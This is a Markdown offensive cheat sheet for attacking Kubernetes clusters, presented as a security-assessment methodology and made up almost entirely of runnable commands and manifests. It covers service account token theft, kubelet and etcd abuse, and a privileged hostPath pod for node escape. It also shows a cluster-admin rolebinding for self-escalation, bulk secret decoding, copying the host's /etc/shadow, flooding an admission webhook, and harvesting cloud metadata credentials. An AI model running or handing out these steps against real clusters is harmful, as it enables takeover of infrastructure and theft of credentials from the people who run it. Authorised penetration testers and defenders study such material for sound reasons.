# Kubernetes Attack Surface Guide

> Comprehensive methodology for assessing Kubernetes cluster security: API server exploitation, RBAC bypass, pod security policy evasion, and lateral movement within clusters.

## 1. Cluster Reconnaissance

```bash
# From a compromised pod, gather cluster information
# Check if service account token is mounted (default behavior)
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Set up kubectl using the service account
export KUBECONFIG=/dev/null
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
export APISERVER=https://kubernetes.default.svc

# Test API access
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces

# Enumerate permissions (what can this service account do?)
# Install kubectl if possible, or use curl
kubectl auth can-i --list --token=$TOKEN
# Or via API:
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

## 2. API Server Exploitation

```bash
# Anonymous access check (misconfiguration)
curl -sk https://APISERVER:6443/api/v1/pods
curl -sk https://APISERVER:6443/api/v1/secrets
curl -sk https://APISERVER:6443/api/v1/namespaces

# Check for exposed kubelet API (port 10250)
curl -sk https://NODE_IP:10250/pods
# If accessible, execute commands in any pod:
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER \
  -d "cmd=id"

# Read-only kubelet port (10255) - information disclosure
curl -s http://NODE_IP:10255/pods | jq '.items[].metadata.name'

# etcd direct access (port 2379) - contains all cluster secrets
# If etcd is exposed without auth:
etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only
etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets/default/
```

## 3. RBAC Privilege Escalation

```yaml
# Check for overly permissive roles
# Dangerous permissions to look for:
# - create pods (can mount host filesystem)
# - create/patch roles/clusterroles (self-escalation)
# - get secrets (access all credentials)
# - impersonate users/groups

# Exploit: If you can create pods, escalate to node access
# malicious-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwned
  namespace: default
spec:
  containers:
  - name: pwned
    image: alpine
    command: ["/bin/sh", "-c", "sleep 999999"]
    volumeMounts:
    - name: host-root
      mountPath: /host
    securityContext:
      privileged: true
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  hostNetwork: true
  hostPID: true
  hostIPC: true
```

```bash
# Apply the malicious pod
kubectl apply -f malicious-pod.yaml --token=$TOKEN
kubectl exec -it pwned -- chroot /host /bin/bash
# Now running as root on the node

# Self-escalation via role binding (if you can create rolebindings)
kubectl create clusterrolebinding pwned-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default \
  --token=$TOKEN
```

## 4. Secret Extraction

```bash
# List all secrets in accessible namespaces
kubectl get secrets --all-namespaces --token=$TOKEN -o json | \
  jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.type)"'

# Decode secrets (base64 encoded)
kubectl get secret db-credentials -o json | \
  jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'

# Extract all secrets in one shot
kubectl get secrets --all-namespaces -o json | \
  jq -r '.items[] | select(.type != "kubernetes.io/service-account-token") |
  "\(.metadata.namespace)/\(.metadata.name):",
  (.data | to_entries[] | "  \(.key): \(.value | @base64d)")'

# Access cloud provider credentials (common in managed K8s)
# AWS IRSA tokens
kubectl get secret -n kube-system -o yaml | grep -A5 "aws"
# GCP workload identity
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## 5. Lateral Movement Between Pods

```bash
# Discover services and pods in the cluster
kubectl get pods --all-namespaces -o wide --token=$TOKEN
kubectl get services --all-namespaces --token=$TOKEN

# DNS enumeration within cluster
# Kubernetes DNS follows: service.namespace.svc.cluster.local
nslookup kubernetes.default.svc.cluster.local
dig +short SRV _https._tcp.kubernetes.default.svc.cluster.local

# Scan internal cluster network
# Pod CIDR typically 10.244.0.0/16 or 10.0.0.0/8
for i in $(seq 1 254); do
  timeout 1 bash -c "echo >/dev/tcp/10.244.0.$i/80" 2>/dev/null && \
    echo "10.244.0.$i:80 open"
done

# Access other pods via service account token theft
# If you can exec into another pod:
kubectl exec -it target-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## 6. Pod Security Bypass

```yaml
# Bypass PodSecurityPolicy/PodSecurity admission
# Technique 1: Find namespaces without enforcement
# Check namespace labels for pod security standards:
# kubectl get ns --show-labels | grep -v "pod-security"

# Technique 2: Use init containers (sometimes less restricted)
apiVersion: v1
kind: Pod
metadata:
  name: bypass-pod
spec:
  initContainers:
  - name: init-escape
    image: alpine
    command: ["sh", "-c", "cat /host-etc/shadow > /shared/shadow"]
    volumeMounts:
    - name: host-etc
      mountPath: /host-etc
      readOnly: true
    - name: shared
      mountPath: /shared
  containers:
  - name: main
    image: alpine
    command: ["sh", "-c", "cat /shared/shadow; sleep 99999"]
    volumeMounts:
    - name: shared
      mountPath: /shared
  volumes:
  - name: host-etc
    hostPath:
      path: /etc
  - name: shared
    emptyDir: {}
```

```bash
# Technique 3: Abuse ephemeral containers (K8s 1.23+)
kubectl debug node/NODE_NAME -it --image=alpine -- chroot /host /bin/bash

# Technique 4: Exploit admission webhook bypass
# If webhook has failurePolicy: Ignore, overwhelm it
for i in $(seq 1 100); do
  kubectl run flood-$i --image=alpine --command -- sleep 9999 &
done
# Some pods may slip through when webhook is overloaded
```

## 7. Cloud Metadata Exploitation

```bash
# From inside a pod, access cloud provider metadata
# AWS Instance Metadata Service (IMDSv1)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# AWS EKS - get node IAM credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | \
  xargs -I{} curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{}

# GCP metadata
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/project-id

# Azure IMDS
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## 8. Automated Assessment Tools

```bash
# kube-hunter: Automated K8s penetration testing
pip install kube-hunter
kube-hunter --remote TARGET_IP
# Or from inside a pod:
kube-hunter --pod

# kubeaudit: Security auditing
kubeaudit all -f deployment.yaml
kubeaudit all --kubeconfig /path/to/kubeconfig

# peirates: Kubernetes penetration testing tool
# https://github.com/inguardians/peirates
./peirates
# Interactive menu for:
# - Service account token harvesting
# - Secret dumping
# - Pod creation for escape
# - Cloud credential theft

# kubectl-who-can: RBAC analysis
kubectl who-can create pods --all-namespaces
kubectl who-can get secrets --all-namespaces
kubectl who-can '*' '*'  # Find cluster-admins

# rbac-police: Identify risky RBAC permissions
kubectl rbac-police --report
```
